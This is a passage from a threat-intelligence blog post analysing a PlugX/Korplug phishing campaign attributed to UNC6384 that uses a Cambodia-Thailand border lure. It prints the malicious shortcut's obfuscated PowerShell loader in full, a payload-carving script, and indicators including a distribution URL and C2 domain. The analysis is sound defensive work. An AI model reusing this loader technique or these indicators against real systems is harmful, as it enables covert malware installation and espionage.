</span></span><span class=line><span class=cl>	Command line arguments		: -w 1 -c          &#34;                                                                                                              ;; ;$ifipuznhxni = (get-childitem -Pa $Env:USERPROFILE -Re -Inc *&#39;NV2230_Update of Situation on Cambodia-Thailand Border&#39;.zip).fullname;                                                                                           ;;$ykvzh=[System.IO.File]::ReadAllBytes($ifipuznhxni);$gujjdckc=854;                                                                                                               ;$qiiobmfibdew=[char]87+&#39;r&#39;+[char]105+&#39;te&#39;+[char]65+&#39;l&#39;+[char]108+&#39;b&#39;+[char]121+&#39;tes&#39;;   ;echo $gujjdckc; ;         ;echo $gujjdckc;;[System.IO.File]::$qiiobmfibdew($Env:temp+&#39;\\rphbqultm.ta&#39;, $ykvzh[$gujjdckc..($gujjdckc+2049024-1)]);   ;;;echo $gujjdckc;;;;echo $gujjdckc;;                                                                                                                 TaR -xvf $Env:TEMP\rphbqultm.ta -C $Env:Temp;;echo $gujjdckc;dir;; Start-Process $Env:temp\CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T\cnmpaui.exe;&#34;
</span></span><span class=line><span class=cl>	Icon location			: .\WindowssSystem326Shell32.pdf
</span></span><span class=line><span class=cl>	Environment variables location	: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
</span></span></code></pre></div><p>The <strong>lnkinfo</strong> output indicated that the shortcut launches PowerShell (<code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)</code> with custom arguments. After cleaning and formatting, the executed PowerShell command was reconstructed as follows.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>System32</span><span class=p>\</span><span class=n>WindowsPowerShell</span><span class=p>\</span><span class=n>v1</span><span class=p>.</span><span class=mf>0</span><span class=p>\</span><span class=n>powershell</span><span class=p>.</span><span class=py>exe</span> <span class=n>-w</span> <span class=mf>1</span> <span class=n>-c</span> <span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2></span><span class=nv>$ifipuznhxni</span><span class=s2> = (
</span></span></span><span class=line><span class=cl><span class=s2>    Get-ChildItem -Pa </span><span class=nv>$Env:USERPROFILE</span><span class=s2> -Re -Inc *&#39;NV2230_Update of Situation on Cambodia-Thailand Border&#39;.zip
</span></span></span><span class=line><span class=cl><span class=s2>).FullName;
</span></span></span><span class=line><span class=cl><span class=s2></span><span class=nv>$ykvzh</span><span class=s2>=[System.IO.File]::ReadAllBytes(</span><span class=nv>$ifipuznhxni</span><span class=s2>);
</span></span></span><span class=line><span class=cl><span class=s2></span><span class=nv>$gujjdckc</span><span class=s2>=854;
</span></span></span><span class=line><span class=cl><span class=s2></span><span class=nv>$qiiobmfibdew</span><span class=s2>=[char]87+&#39;r&#39;+[char]105+&#39;te&#39;+[char]65+&#39;l&#39;+[char]108+&#39;b&#39;+[char]121+&#39;tes&#39;;
</span></span></span><span class=line><span class=cl><span class=s2>echo </span><span class=nv>$gujjdckc</span><span class=s2>;
</span></span></span><span class=line><span class=cl><span class=s2>echo </span><span class=nv>$gujjdckc</span><span class=s2>;
</span></span></span><span class=line><span class=cl><span class=s2>[System.IO.File]::</span><span class=nv>$qiiobmfibdew</span><span class=s2>(
</span></span></span><span class=line><span class=cl><span class=s2>    </span><span class=nv>$Env:temp</span><span class=s2> + &#39;\rphbqultm.ta&#39;,
</span></span></span><span class=line><span class=cl><span class=s2>    </span><span class=nv>$ykvzh</span><span class=s2>[</span><span class=nv>$gujjdckc</span><span class=s2>..(</span><span class=nv>$gujjdckc</span><span class=s2> + 2049024 - 1)]
</span></span></span><span class=line><span class=cl><span class=s2>);
</span></span></span><span class=line><span class=cl><span class=s2>echo </span><span class=nv>$gujjdckc</span><span class=s2>;
</span></span></span><span class=line><span class=cl><span class=s2>echo </span><span class=nv>$gujjdckc</span><span class=s2>;
</span></span></span><span class=line><span class=cl><span class=s2>TaR -xvf </span><span class=nv>$Env:TEMP</span><span class=s2>\rphbqultm.ta -C </span><span class=nv>$Env:Temp</span><span class=s2>;
</span></span></span><span class=line><span class=cl><span class=s2>echo </span><span class=nv>$gujjdckc</span><span class=s2>;
</span></span></span><span class=line><span class=cl><span class=s2>dir;
</span></span></span><span class=line><span class=cl><span class=s2>Start-Process </span><span class=nv>$Env:temp</span><span class=s2>\CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T\cnmpaui.exe;&#34;</span>
</span></span></code></pre></div><p>In this context:</p><ul><li>The <code>-c</code> argument represents <code>-Command</code>, specifying the command string to execute.</li><li>The <code>-w 1</code> argument configures the PowerShell window style to minimized, effectively hiding execution from the user.</li></ul><p><strong>PowerShell Script Behavior</strong></p><ol><li>Search and Locate ZIP File<ul><li>The script searches the user&rsquo;s profile directory for any ZIP file whose name contained <code>NV2230_Update of Situation on Cambodia-Thailand Border</code>. This approach ensured the LNK could locate the archive regardless of where the recipient had saved or extracted it.</li></ul></li><li>Read ZIP File into Memory<ul><li>It reads the contents of the located ZIP file into memory as a byte array.</li></ul></li><li>Extract Embedded Payload<ul><li>The variable <code>$gujjdckc</code> defines an offset value of 854 bytes, indicating where to begin extracting a hidden data segment within the ZIP file. A new string variable is then constructed dynamically using character codes, producing the method name <code>WriteAllBytes</code>. This obfuscation is intended to make static analysis more difficult.</li></ul></li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>[char]87 + &#39;r&#39;      → &#34;Wr&#34;
</span></span><span class=line><span class=cl>+ [char]105         → &#34;Wri&#34;
</span></span><span class=line><span class=cl>+ &#39;te&#39;              → &#34;Write&#34;
</span></span><span class=line><span class=cl>+ [char]65          → &#34;WriteA&#34;
</span></span><span class=line><span class=cl>+ &#39;l&#39;               → &#34;WriteAl&#34;
</span></span><span class=line><span class=cl>+ [char]108         → &#34;WriteAll&#34;
</span></span><span class=line><span class=cl>+ &#39;b&#39;               → &#34;WriteAllb&#34;
</span></span><span class=line><span class=cl>+ [char]121         → &#34;WriteAllby&#34;
</span></span><span class=line><span class=cl>+ &#39;tes&#39;             → &#34;WriteAllbytes&#34;
</span></span></code></pre></div><ol start=4><li>Write and Extract Payload<ul><li>The script writes a 2049024 byte section from the ZIP file, beginning at byte offset 854, into a temporary file named <code>%TEMP%\rphbqultm.ta</code>. It then extracts this archive using the <strong>tar</strong> utility into the <code>%TEMP%</code> directory.</li></ul></li><li>Execution of Dropped Binary<ul><li>Finally, the script executes the file <code>cnmpaui.exe</code> from a directory named <code>CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T</code> within <code>%TEMP%</code>.</li></ul></li></ol><p>Throughout the PowerShell command, multiple <code>echo</code> and <code>dir</code> commands are present. These commands appeared to serve a debugging purpose and do not alter the execution flow.</p><h4 id=stage-2--loader--secondary-payload--rat-deployment>Stage 2 : Loader / Secondary Payload / RAT Deployment<a hidden class=anchor aria-hidden=true href=#stage-2--loader--secondary-payload--rat-deployment>#</a></h4><p>A short Python script was used to reproduce the extraction behavior observed in the PowerShell command embedded in the LNK file. The script reads the file <code>NV2230_Update of Situation on Cambodia-Thailand Border.zip</code>, extracts the byte range starting at offset 854 for 2049024 bytes and writes the result to <code>rphbqultm.ta</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>input_file</span> <span class=o>=</span> <span class=s2>&#34;NV2230_Update of Situation on Cambodia-Thailand Border.zip&#34;</span>
</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=mi>854</span>
</span></span><span class=line><span class=cl><span class=n>length</span> <span class=o>=</span> <span class=mi>2049024</span>
</span></span><span class=line><span class=cl><span class=n>output_file</span> <span class=o>=</span> <span class=s2>&#34;rphbqultm.ta&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>input_file</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f_in</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>f_in</span><span class=o>.</span><span class=n>seek</span><span class=p>(</span><span class=n>offset</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>f_in</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=n>length</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>output_file</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f_out</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>f_out</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span></code></pre></div><p>The script successfully wrote the expected number of bytes and produced a file that was identified as a tar archive. The archive was then extracted to reveal a directory containing three files.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ python3 archive_extractor.py 
</span></span><span class=line><span class=cl>Wrote 2049024 bytes to &#39;rphbqultm.ta&#39;.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ file rphbqultm.ta 
</span></span><span class=line><span class=cl>rphbqultm.ta: POSIX tar archive
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ tar -xvf rphbqultm.ta
</span></span><span class=line><span class=cl>CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/
</span></span><span class=line><span class=cl>CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmpaui.dll
</span></span><span class=line><span class=cl>CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmpaui.exe
</span></span><span class=line><span class=cl>CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmplog.dat
</span></span></code></pre></div><p>File type identification reported the following.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ file CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/*
</span></span><span class=line><span class=cl>CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmpaui.dll: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows, 4 sections
</span></span><span class=line><span class=cl>CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmpaui.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 6 sections
</span></span><span class=line><span class=cl>CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmplog.dat: data
</span></span></code></pre></div><p>Signature verification was performed using <strong>osslsigncode</strong> <a href=#references>[03]</a>. Result indicated that <code>cnmpaui.exe</code> is authentically signed by <em>Canon</em>, however, the signing certificate had expired in 2018.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ osslsigncode verify CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmpaui.exe 
</span></span><span class=line><span class=cl>PE checksum   : 000608B0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Signature Index: 0  (Primary Signature)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Message digest algorithm  : SHA1
</span></span><span class=line><span class=cl>Current message digest    : 76E99ABD3FEF78E76BE262AFB943713261F3D650 
</span></span><span class=line><span class=cl>Calculated message digest : 76E99ABD3FEF78E76BE262AFB943713261F3D650 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Signer&#39;s certificate:
</span></span><span class=line><span class=cl>	------------------
</span></span><span class=line><span class=cl>	Signer #0:
</span></span><span class=line><span class=cl>		Subject: /C=JP/ST=Kanagawa/L=Kawasaki-shi/O=Canon Inc./OU=Inkjet System Development Center/CN=Canon Inc.
</span></span><span class=line><span class=cl>		Issuer : /C=US/O=VeriSign, Inc./OU=VeriSign Trust Network/OU=Terms of use at https:\/\/www.verisign.com\/rpa (c)10/CN=VeriSign Class 3 Code Signing 2010 CA
</span></span><span class=line><span class=cl>		Serial : 20A947947E703391C3008B626606FA8F
</span></span><span class=line><span class=cl>		Certificate expiration date:
</span></span><span class=line><span class=cl>			notBefore : Mar 30 00:00:00 2015 GMT
</span></span><span class=line><span class=cl>			notAfter : Apr 18 23:59:59 2018 GMT
</span></span><span class=line><span class=cl>. . .
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Signature Index: 1 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Message digest algorithm  : SHA256
</span></span><span class=line><span class=cl>Current message digest    : D9E0CAD06D399BF9BFB39BF15631320A1BCEA4D7E32DE152252BD25B3A21E6A4 
</span></span><span class=line><span class=cl>Calculated message digest : D9E0CAD06D399BF9BFB39BF15631320A1BCEA4D7E32DE152252BD25B3A21E6A4 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Signer&#39;s certificate:
</span></span><span class=line><span class=cl>	------------------
</span></span><span class=line><span class=cl>	Signer #0:
</span></span><span class=line><span class=cl>		Subject: /C=JP/ST=Kanagawa/L=Kawasaki-shi/O=Canon Inc./OU=Inkjet System Development Center/CN=Canon Inc.
</span></span><span class=line><span class=cl>		Issuer : /C=US/O=Symantec Corporation/OU=Symantec Trust Network/CN=Symantec Class 3 SHA256 Code Signing CA
</span></span><span class=line><span class=cl>		Serial : 6B648EAF4604EE3CF3AA244B0286F161
</span></span><span class=line><span class=cl>		Certificate expiration date:
</span></span><span class=line><span class=cl>			notBefore : Sep  7 00:00:00 2015 GMT
</span></span><span class=line><span class=cl>			notAfter : Apr 18 23:59:59 2018 GMT
</span></span><span class=line><span class=cl>. . .
</span></span></code></pre></div><p>Next, the file <code>cnmpaui.dll</code> was analyzed using <strong>Detect It Easy (DiE)</strong> <a href=#references>[04]</a>. The tool produced the following output.</p><p><img loading=lazy src=/images/general/chinese_unc6384_malware_campaign_exploits_cambodia_thailand_crisis/4-X-DiE-DLL-Information.png alt></p><p>At approximately 4 KB, the DLL was notably small, indicating it most likely functioned as a loader / decryptor.</p><p>As found out from the Powershell script that was embeded in the LNK file, Canon&rsquo;s IJ Printer Assistant Tool (<code>cnmpaui.exe</code>) is launched, which uses DLL Sideloading technique to load the <code>cnmpaui.dll</code>, that decrypts <code>cnmpaui.dat</code>.</p><p>During the execution flow, the victim was presented with a document titled <code>2025.09.30_NV2230_Update of Situation on Cambodia-Thailand Border(For 28-29 Sept 2025).pdf</code> to make the download seem legitimate, distracting the victim while the malicious code was executed in the background.</p><p><img loading=lazy src=/images/general/chinese_unc6384_malware_campaign_exploits_cambodia_thailand_crisis/5-PDF-File.png alt></p><p>Detonating the analyzed sample in the sandbox allowed us to determine the C2 domain used:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>dorareco.net
</span></span></code></pre></div><p>Complete analysis based on sandbox execution can be found on Recorded Future Triage <a href=#references>[05]</a>.</p><h2 id=attribution>Attribution<a hidden class=anchor aria-hidden=true href=#attribution>#</a></h2><p>Leveraging the collected technical evidence together with OSINT, the analyzed sample was confidently identified as a variant associated with the <strong>SOGU.SEC</strong> (also known as <strong>PlugX</strong> or <strong>Korplug</strong>) malware documented in Google Cloud’s Threat Intelligence (Mandiant) report titled <strong>Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats</strong>, published August 25, 2025 <a href=#references>[06]</a>. According to the report, the <strong>UNC6384</strong> threat actor, a cluster associated with Chinese state linked cyber espionage, conducted targeted operations against diplomatic and governmental organizations. The group employed DLL Sideloading technique, encrypted configuration data, and modular payloads to maintain persistence.</p><p>The observed delivery method, execution pattern (PowerShell, tar extraction, signed Canon executable, DLL Sideloading) and other technical evidence, strongly matched the <strong>UNC6384</strong> activity cluster documented by mentioned Google Cloud’s Threat Intelligence (Mandiant) report. This alignment strengthened the operational attribution to <strong>UNC6384</strong> and provided context for the targeting of diplomatic entities described in the public report.</p><p>Additional samples demonstrating similar behavior have been identified and analyzed in other independent research efforts, including:</p><ul><li><strong>Cyber Threat Intelligence Briefing: Mustang Panda Spear-Phishing Campaign Exploiting the Cambodia-Thailand Border Situation</strong> by Pisut Muangsamai <a href=#references>[07]</a></li><li><strong>CN APT targets Serbian Government</strong> by StrikeReady Labs <a href=#references>[08]</a></li></ul><p>For a more detailed technical analysis of the <strong>Korplug</strong> malware, readers may refer to the two part analysis by RevEng.AI:</p><ul><li><strong>Unmasking KorPlug: A Technical Breakdown - Part 1</strong> <a href=#references>[09]</a></li><li><strong>Unmasking KorPlug: A Technical Breakdown - Part 2</strong> <a href=#references>[10]</a></li></ul><hr><h2 id=indicators-of-compromise-iocs>Indicators of Compromise (IoCs)<a hidden class=anchor aria-hidden=true href=#indicators-of-compromise-iocs>#</a></h2><p><strong>URL (Malware Distribution)</strong></p><table><thead><tr><th>Category</th><th>Value</th></tr></thead><tbody><tr><td><code>Azure storage</code></td><td><code>https://mydownload.z29.web.core.windows.net/NV2230_Update_of_Situation_on_Cambodia-Thailand_Border.zip</code></td></tr></tbody></table><p><strong>Command and Control (C2)</strong></p><table><thead><tr><th>Category</th><th>Value</th></tr></thead><tbody><tr><td><code>C2 (domain)</code></td><td><code>dorareco.net</code></td></tr></tbody></table><p><strong>Malware Files / Artifacts</strong></p><table><thead><tr><th>Filename / Artifact</th><th>MD5</th><th>SHA-1</th><th>SHA-256</th></tr></thead><tbody><tr><td><code>NV2230_Update of Situation on Cambodia-Thailand Border.zip</code></td><td><code>c33861eb02323660ecef2f261f92880d</code></td><td><code>83c3cda4bc929a84ccc16a25595a1e85ee433faf</code></td><td><code>b15acbf8509ee90858a1d60eea3c50094b1e2b0b65c8596c65fc998e9b6a08a9</code></td></tr><tr><td><code>NV2230_Update of Situation on Cambodia-Thailand Border.lnk</code></td><td><code>bb74ca3517e51030867ced3a8ceb149d</code></td><td><code>7c465b66ff8ef4132e74ab489f6731bd26a4b64d</code></td><td><code>8635dcc2001514febc6a07714b8cf6a3684b4c4c3b8fc0e08b2f6b92a045e3cc</code></td></tr><tr><td><code>rphbqultm.ta</code></td><td><code>80639fb809c24ab2f12ea7c4da167862</code></td><td><code>572fc5774568e536f956a002e67ade23af19b034</code></td><td><code>f04340f93e2f5f7d6d5521572f17c5b80f39984ee6b4b8c0899380e95a825127</code></td></tr><tr><td><code>cnmpaui.dll</code></td><td><code>a38de163ee19e78d8582efb9d7f286c1</code></td><td><code>1ca908b27701259472c16614c3a69f48752bf6cf</code></td><td><code>e35d8815206a77028b7b43bfb047eb9ad8a151164f5c1a7b6d3294bd50b668f2</code></td></tr><tr><td><code>cnmpaui.exe</code></td><td><code>0538e73fc195c3b4441721d4c60d0b96</code></td><td><code>baa569318144905563b469a5a006ad54eb616a02</code></td><td><code>4ed76fa68ef9e1a7705a849d47b3d9dcdf969e332bd5bcb68138579c288a16d3</code></td></tr><tr><td><code>cnmplog.dat</code></td><td><code>f4b1a1516c99a196cd4d6af18f611766</code></td><td><code>46a530dd71b20a2b3f30b411dbe86f48e3d07750</code></td><td><code>d70600f0e4367e6e3e07f7b965b654e5bfbcb0afbccfe0f6a9a8d9f69c7061a3</code></td></tr></tbody></table><hr><h2 id=appendices>Appendices<a hidden class=anchor aria-hidden=true href=#appendices>#</a></h2><h3 id=appendix-a--c2-domain-name-whois-record>Appendix A : C2 Domain Name WHOIS Record<a hidden class=anchor aria-hidden=true href=#appendix-a--c2-domain-name-whois-record>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Domain name: dorareco.net
</span></span><span class=line><span class=cl>Registry Domain ID: 3023929170_DOMAIN_NET-VRSN
</span></span><span class=line><span class=cl>Registrar WHOIS Server: whois.namecheap.com
</span></span><span class=line><span class=cl>Registrar URL: http://www.namecheap.com
</span></span><span class=line><span class=cl>Updated Date: 0001-01-01T00:00:00.00Z
</span></span><span class=line><span class=cl>Creation Date: 2025-09-28T08:20:33.00Z
</span></span><span class=line><span class=cl>Registrar Registration Expiration Date: 2026-09-28T08:20:33.00Z
</span></span><span class=line><span class=cl>Registrar: NAMECHEAP INC
</span></span><span class=line><span class=cl>Registrar IANA ID: 1068
</span></span><span class=line><span class=cl>Registrar Abuse Contact Email: abuse@namecheap.com
</span></span><span class=line><span class=cl>Registrar Abuse Contact Phone: +1.9854014545
</span></span><span class=line><span class=cl>Reseller: NAMECHEAP INC
</span></span><span class=line><span class=cl>Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
</span></span><span class=line><span class=cl>Registry Registrant ID: 
</span></span><span class=line><span class=cl>Registrant Name: Redacted for Privacy
</span></span><span class=line><span class=cl>Registrant Organization: Privacy service provided by Withheld for Privacy ehf
</span></span><span class=line><span class=cl>Registrant Street: Kalkofnsvegur 2 
</span></span><span class=line><span class=cl>Registrant City: Reykjavik
</span></span><span class=line><span class=cl>Registrant State/Province: Capital Region
</span></span><span class=line><span class=cl>Registrant Postal Code: 101
</span></span><span class=line><span class=cl>Registrant Country: IS
</span></span><span class=line><span class=cl>Registrant Phone: +354.4212434
</span></span><span class=line><span class=cl>Registrant Phone Ext: 
</span></span><span class=line><span class=cl>Registrant Fax: 
</span></span><span class=line><span class=cl>Registrant Fax Ext: 
</span></span><span class=line><span class=cl>Registrant Email: ceb7a36e45864be88d86367fbec8e38e.protect@withheldforprivacy.com
</span></span><span class=line><span class=cl>Registry Admin ID: 
</span></span><span class=line><span class=cl>Admin Name: Redacted for Privacy
</span></span><span class=line><span class=cl>Admin Organization: Privacy service provided by Withheld for Privacy ehf
</span></span><span class=line><span class=cl>Admin Street: Kalkofnsvegur 2 
</span></span><span class=line><span class=cl>Admin City: Reykjavik
</span></span><span class=line><span class=cl>Admin State/Province: Capital Region
</span></span><span class=line><span class=cl>Admin Postal Code: 101
</span></span><span class=line><span class=cl>Admin Country: IS
</span></span><span class=line><span class=cl>Admin Phone: +354.4212434
</span></span><span class=line><span class=cl>Admin Phone Ext: 
</span></span><span class=line><span class=cl>Admin Fax: 
</span></span><span class=line><span class=cl>Admin Fax Ext: 
</span></span><span class=line><span class=cl>Admin Email: ceb7a36e45864be88d86367fbec8e38e.protect@withheldforprivacy.com
</span></span><span class=line><span class=cl>Registry Tech ID: 
</span></span><span class=line><span class=cl>Tech Name: Redacted for Privacy
</span></span><span class=line><span class=cl>Tech Organization: Privacy service provided by Withheld for Privacy ehf
</span></span><span class=line><span class=cl>Tech Street: Kalkofnsvegur 2 
</span></span><span class=line><span class=cl>Tech City: Reykjavik
</span></span><span class=line><span class=cl>Tech State/Province: Capital Region
</span></span><span class=line><span class=cl>Tech Postal Code: 101
</span></span><span class=line><span class=cl>Tech Country: IS
</span></span><span class=line><span class=cl>Tech Phone: +354.4212434
</span></span><span class=line><span class=cl>Tech Phone Ext: 
</span></span><span class=line><span class=cl>Tech Fax: 
</span></span><span class=line><span class=cl>Tech Fax Ext: 
</span></span><span class=line><span class=cl>Tech Email: ceb7a36e45864be88d86367fbec8e38e.protect@withheldforprivacy.com
</span></span><span class=line><span class=cl>Name Server: dns1.registrar-servers.com
</span></span><span class=line><span class=cl>Name Server: dns2.registrar-servers.com
</span></span></code></pre></div><hr><h2 id=references>References<a hidden class=anchor aria-hidden=true href=#references>#</a></h2><ul><li>[01] <strong>2025 Cambodia Thailand border crisis</strong>: <a href=https://en.wikipedia.org/wiki/2025_Cambodian%E2%80%93Thai_border_crisis>https://en.wikipedia.org/wiki/2025_Cambodian%E2%80%93Thai_border_crisis</a></li><li>[02] <strong>liblnk-utils</strong> : <a href=https://launchpad.net/ubuntu/noble/+package/liblnk-utils>https://launchpad.net/ubuntu/noble/+package/liblnk-utils</a></li><li>[03] <strong>osslsigncode</strong> : <a href=https://github.com/mtrojnar/osslsigncode>https://github.com/mtrojnar/osslsigncode</a></li><li>[04] <strong>Detect It Easy (DiE)</strong> : <a href=https://github.com/horsicq/Detect-It-Easy>https://github.com/horsicq/Detect-It-Easy</a></li><li>[05] <strong>Recorded Future Triage (Sample Analysis)</strong> : <a href=https://tria.ge/251021-g4nhbsgr4v>https://tria.ge/251021-g4nhbsgr4v</a></li><li>[06] <strong>Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats</strong> : <a href=https://cloud.google.com/blog/topics/threat-intelligence/prc-nexus-espionage-targets-diplomats>https://cloud.google.com/blog/topics/threat-intelligence/prc-nexus-espionage-targets-diplomats</a></li><li>[07] <strong>Cyber Threat Intelligence Briefing: Mustang Panda Spear-Phishing Campaign Exploiting the Cambodia-Thailand Border Situation</strong> : <a href=https://www.linkedin.com/pulse/cyber-threat-intelligence-briefing-mustang-panda-pisut-muangsamai-7mtfc/>https://www.linkedin.com/pulse/cyber-threat-intelligence-briefing-mustang-panda-pisut-muangsamai-7mtfc/</a></li><li>[08] <strong>CN APT targets Serbian Government</strong> : <a href=https://strikeready.com/blog/cn-apt-targets-serbian-government/>https://strikeready.com/blog/cn-apt-targets-serbian-government/</a></li><li>[09] <strong>Unmasking KorPlug: A Technical Breakdown - Part 1</strong> : <a href=https://blog.reveng.ai/unmasking-korplug-journey-into-a-chinese-cyberattack-part-1-2/>https://blog.reveng.ai/unmasking-korplug-journey-into-a-chinese-cyberattack-part-1-2/</a></li><li>[10] <strong>Unmasking KorPlug: A Technical Breakdown - Part 2</strong> : <a href=https://blog.reveng.ai/unmasking-korplug-a-technical-breakdown-part-2/>https://blog.reveng.ai/unmasking-korplug-a-technical-breakdown-part-2/</a></li></ul><hr></div><footer class=post-footer><ul class=post-tags><li><a href=https://martinkubecka.sk/tags/threat-intelligence/>Threat Intelligence</a></li><li><a href=https://martinkubecka.sk/tags/malware-analysis/>Malware Analysis</a></li><li><a href=https://martinkubecka.sk/tags/phishing-campaign/>Phishing Campaign</a></li><li><a href=https://martinkubecka.sk/tags/unc6384/>UNC6384</a></li><li><a href=https://martinkubecka.sk/tags/sogu.sec/>SOGU.SEC</a></li><li><a href=https://martinkubecka.sk/tags/plugx/>PlugX</a></li><li><a href=https://martinkubecka.sk/tags/korplug/>Korplug</a></li><li><a href=https://martinkubecka.sk/tags/dll-sideloading/>DLL Sideloading</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://martinkubecka.sk>Martin Kubečka</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let b=document.querySelector("#menu-trigger"),m=document.querySelector(".menu");b.addEventListener("click",function(){m.classList.toggle("hidden")}),document.body.addEventListener("click",function(e){b.contains(e.target)||m.classList.add("hidden")})</script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>